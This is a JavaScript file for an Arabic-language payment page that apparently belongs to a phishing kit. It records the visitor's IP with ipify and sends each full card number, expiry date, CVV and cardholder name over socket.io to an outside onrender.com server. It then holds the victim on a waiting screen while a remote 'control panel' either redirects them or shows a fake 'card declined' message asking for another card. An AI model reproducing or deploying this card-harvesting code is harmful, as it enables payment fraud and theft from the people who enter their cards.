
$(document).ready(function() {
    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "paymen.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            if (page.includes("declined=true")) {
                $("#waitingScreen").removeClass("active");
                alert("تم رفض البطاقة، يرجى المحاولة ببطاقة أخرى");
            } else {
                window.location.href = page;
            }
        }
    });

    $("#paymentForm").on("submit", function(e) {
        e.preventDefault();
        $("#waitingScreen").addClass("active");

        const data = {
            ip: window.visitorIP,
            total: $("input[name='amount']:checked").val(),
            cardNumber: $("input[name='cardNumber']").val(),
            expiryDate: $("input[name='year']").val(),
            cvv: $("input[name='cvv']").val(),
            cardHolderName: $("input[name='cardName']").val(),
            cardLast4: $("input[name='cardNumber']").val().slice(-4),
            createdAt: new Date()
        };

        if (window.visitorIP) {
            window.socket.emit("submitPayment", data);
            // لا ننتقل تلقائياً، ننتظر لوحة التحكم
        } else {
            $("#waitingScreen").removeClass("active");
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
